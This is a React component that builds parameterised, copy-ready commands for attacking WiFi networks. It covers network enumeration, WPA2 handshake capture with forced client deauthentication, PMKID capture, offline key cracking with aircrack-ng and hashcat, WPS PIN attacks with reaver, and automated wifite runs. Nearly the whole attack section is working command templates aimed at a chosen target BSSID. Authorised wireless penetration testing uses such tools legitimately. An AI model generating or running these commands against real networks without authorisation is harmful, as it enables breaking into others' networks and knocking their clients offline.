import { useState, useCallback } from "react";

const ATTACKS = [
  {
    id: "enumerate",
    label: "WiFi Enumeration",
    icon: "📡",
    description: "Scan for nearby wireless networks",
    steps: (p) => [
      { cmd: `sudo airmon-ng check kill`, note: "Kill interfering processes" },
      { cmd: `sudo airmon-ng start ${p.iface}`, note: `Enable monitor mode on ${p.iface}` },
      { cmd: `sudo airodump-ng ${p.iface}mon`, note: "Scan all channels — note target BSSID and channel" },
    ],
  },
  {
    id: "handshake",
    label: "WPA2 Handshake",
    icon: "🤝",
    description: "Capture 4-way handshake for offline cracking",
    steps: (p) => [
      { cmd: `sudo airmon-ng check kill && sudo airmon-ng start ${p.iface}`, note: "Monitor mode" },
      { cmd: `sudo airodump-ng -c ${p.channel} --bssid ${p.bssid} -w /tmp/pentest/capture ${p.iface}mon`, note: "Capture on target channel" },
      { cmd: `sudo aireplay-ng -0 5 -a ${p.bssid}${p.clientMac ? ` -c ${p.clientMac}` : ""} ${p.iface}mon`, note: "Deauth to force reconnection (run in 2nd terminal)" },
      { cmd: `# Wait for 'WPA handshake: ${p.bssid}' in airodump output`, note: "Handshake captured!" },
    ],
  },
  {
    id: "pmkid",
    label: "PMKID Capture",
    icon: "🔑",
    description: "Clientless WPA2 capture — no deauth needed",
    steps: (p) => [
      { cmd: `sudo airmon-ng check kill && sudo airmon-ng start ${p.iface}`, note: "Monitor mode" },
      { cmd: `sudo hcxdumptool -i ${p.iface}mon -o /tmp/pentest/pmkid.pcapng --filterlist_ap=${p.bssid} --filtermode=2`, note: "Capture PMKID (wait 1-5 min)" },
      { cmd: `hcxpcapngtool -o /tmp/pentest/pmkid.hc22000 /tmp/pentest/pmkid.pcapng`, note: "Convert for hashcat" },
    ],
  },
  {
    id: "crack",
    label: "Crack WPA Key",
    icon: "💥",
    description: "Offline cracking of captured handshake/PMKID",
    steps: (p) => [
      { cmd: `# Option 1: aircrack-ng (CPU)`, note: "Fast start, slower cracking" },
      { cmd: `aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/pentest/capture-01.cap`, note: "Dictionary attack" },
      { cmd: `# Option 2: hashcat (GPU — much faster)`, note: "Convert first" },
      { cmd: `hcxpcapngtool -o /tmp/pentest/hash.hc22000 /tmp/pentest/capture-01.cap`, note: "Convert .cap to hashcat format" },
      { cmd: `hashcat -m 22000 /tmp/pentest/hash.hc22000 /usr/share/wordlists/rockyou.txt`, note: "GPU dictionary attack" },
      { cmd: `hashcat -m 22000 /tmp/pentest/hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, note: "With rules (better coverage)" },
    ],
  },
  {
    id: "wps",
    label: "WPS Attack",
    icon: "📌",
    description: "Attack WPS PIN — try Pixie Dust first",
    steps: (p) => [
      { cmd: `sudo airmon-ng check kill && sudo airmon-ng start ${p.iface}`, note: "Monitor mode" },
      { cmd: `sudo reaver -i ${p.iface}mon -b ${p.bssid} -K 1 -vv`, note: "Pixie Dust attack (fast, try first)" },
      { cmd: `# If Pixie Dust fails:`, note: "Fall back to brute force" },
      { cmd: `sudo reaver -i ${p.iface}mon -b ${p.bssid} -vv -d 2 -t 5`, note: "Brute force WPS PIN (slow, hours)" },
    ],
  },
  {
    id: "auto",
    label: "Automated (wifite)",
    icon: "🤖",
    description: "All-in-one automated WiFi attack",
    steps: (p) => [
      { cmd: `sudo wifite --kill -i ${p.iface}`, note: "Auto-select and attack nearby networks" },
      { cmd: `# Or target specific network:`, note: "" },
      { cmd: `sudo wifite --kill -i ${p.iface} -b ${p.bssid}`, note: "Target specific BSSID" },
    ],
  },
];

export default function WirelessCommandGenerator() {
  const [selectedAttack, setSelectedAttack] = useState("enumerate");
  const [params, setParams] = useState({
    iface: "wlan0",
    bssid: "AA:BB:CC:DD:EE:FF",
    channel: "6",
    clientMac: "",
  });
  const [copied, setCopied] = useState(null);

  const attack = ATTACKS.find((a) => a.id === selectedAttack);
  const steps = attack?.steps(params) || [];

  const copyCmd = useCallback((cmd, idx) => {
    navigator.clipboard?.writeText(cmd);
    setCopied(idx);
    setTimeout(() => setCopied(null), 1500);
  }, []);

  const copyAll = useCallback(() => {
    const allCmds = steps.map((s) => s.cmd).join("\n");
    navigator.clipboard?.writeText(allCmds);
    setCopied("all");
    setTimeout(() => setCopied(null), 1500);
  }, [steps]);

  return (
    <div style={{
      fontFamily: "'IBM Plex Mono', monospace",
      background: "#080b11",
      color: "#cbd5e1",
      borderRadius: "12px",
      border: "1px solid #1e293b",
      overflow: "hidden",
    }}>
      {/* Header */}
      <div style={{
        padding: "12px 16px",
        borderBottom: "1px solid #1e293b",
        background: "linear-gradient(90deg, #0f172a, #1e1b4b)",
        display: "flex", justifyContent: "space-between", alignItems: "center",
      }}>
        <div>
          <div style={{ fontSize: "12px", fontWeight: 800, color: "#a78bfa", letterSpacing: "0.06em" }}>
            📡 WIRELESS ATTACK GENERATOR
          </div>
          <div style={{ fontSize: "9px", color: "#64748b", marginTop: "2px" }}>
            Commands only — operator must execute in person
          </div>
        </div>
        <div style={{
          fontSize: "8px", padding: "3px 8px", borderRadius: "4px",
          background: "#dc262622", border: "1px solid #dc262644", color: "#f87171",
        }}>
          ⚠️ REQUIRES PHYSICAL HARDWARE
        </div>
      </div>

      {/* Attack Type Selector */}
      <div style={{
        display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "4px",
        padding: "12px",
      }}>
        {ATTACKS.map((a) => (
          <button key={a.id} onClick={() => setSelectedAttack(a.id)}
            style={{
              padding: "8px 6px",
              borderRadius: "6px",
              border: `1px solid ${selectedAttack === a.id ? "#8b5cf6" : "#1e293b"}`,
              background: selectedAttack === a.id ? "#8b5cf622" : "#0f172a",
              color: selectedAttack === a.id ? "#a78bfa" : "#64748b",
              fontSize: "10px", fontWeight: 600,
              fontFamily: "inherit", cursor: "pointer",
              textAlign: "center",
            }}>
            <div style={{ fontSize: "16px" }}>{a.icon}</div>
            <div style={{ marginTop: "2px" }}>{a.label}</div>
          </button>
        ))}
      </div>

      {/* Parameters */}
      <div style={{ padding: "0 12px 12px", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" }}>
        <ParamInput label="INTERFACE" value={params.iface}
          onChange={(v) => setParams((p) => ({ ...p, iface: v }))} placeholder="wlan0" />
        <ParamInput label="BSSID" value={params.bssid}
          onChange={(v) => setParams((p) => ({ ...p, bssid: v }))} placeholder="AA:BB:CC:DD:EE:FF" />
        <ParamInput label="CHANNEL" value={params.channel}
          onChange={(v) => setParams((p) => ({ ...p, channel: v }))} placeholder="6" />
        <ParamInput label="CLIENT MAC (optional)" value={params.clientMac}
          onChange={(v) => setParams((p) => ({ ...p, clientMac: v }))} placeholder="11:22:33:44:55:66" />
      </div>

      {/* Generated Commands */}
      <div style={{ padding: "0 12px 12px" }}>
        <div style={{
          display: "flex", justifyContent: "space-between", alignItems: "center",
          marginBottom: "8px",
        }}>
          <div style={{ fontSize: "10px", fontWeight: 700, color: "#64748b", letterSpacing: "0.08em" }}>
            {attack?.label.toUpperCase()} — {attack?.description}
          </div>
          <button onClick={copyAll} style={{
            padding: "3px 8px", borderRadius: "4px", border: "1px solid #334155",
            background: copied === "all" ? "#16a34a" : "#1e293b",
            color: copied === "all" ? "#fff" : "#94a3b8",
            fontSize: "9px", fontFamily: "inherit", cursor: "pointer",
          }}>
            {copied === "all" ? "COPIED" : "COPY ALL"}
          </button>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
          {steps.map((step, i) => (
            <div key={i} style={{
              display: "flex", gap: "8px", alignItems: "flex-start",
              padding: "6px 8px",
              background: step.cmd.startsWith("#") ? "transparent" : "#0f172a",
              borderRadius: "4px",
              border: step.cmd.startsWith("#") ? "none" : "1px solid #1e293b",
            }}>
              <div style={{ flex: 1, minWidth: 0 }}>
                <code style={{
                  fontSize: "11px",
                  color: step.cmd.startsWith("#") ? "#475569" : "#e2e8f0",
                  fontStyle: step.cmd.startsWith("#") ? "italic" : "normal",
                  wordBreak: "break-all",
                }}>
                  {step.cmd}
                </code>
                {step.note && (
                  <div style={{ fontSize: "9px", color: "#64748b", marginTop: "2px" }}>
                    {step.note}
                  </div>
                )}
              </div>
              {!step.cmd.startsWith("#") && (
                <button onClick={() => copyCmd(step.cmd, i)} style={{
                  padding: "2px 6px", borderRadius: "3px",
                  border: "1px solid #33415544",
                  background: copied === i ? "#16a34a" : "transparent",
                  color: copied === i ? "#fff" : "#475569",
                  fontSize: "9px", fontFamily: "inherit", cursor: "pointer",
                  flexShrink: 0,
                }}>
                  {copied === i ? "✓" : "⎘"}
                </button>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function ParamInput({ label, value, onChange, placeholder }) {
  return (
    <div>
      <div style={{ fontSize: "8px", fontWeight: 700, color: "#475569", letterSpacing: "0.1em", marginBottom: "3px" }}>
        {label}
      </div>
      <input value={value} onChange={(e) => onChange(e.target.value)} placeholder={placeholder}
        style={{
          width: "100%", padding: "6px 8px", borderRadius: "4px",
          border: "1px solid #334155", background: "#0f172a", color: "#e2e8f0",
          fontSize: "11px", fontFamily: "inherit", outline: "none", boxSizing: "border-box",
        }} />
    </div>
  );
}
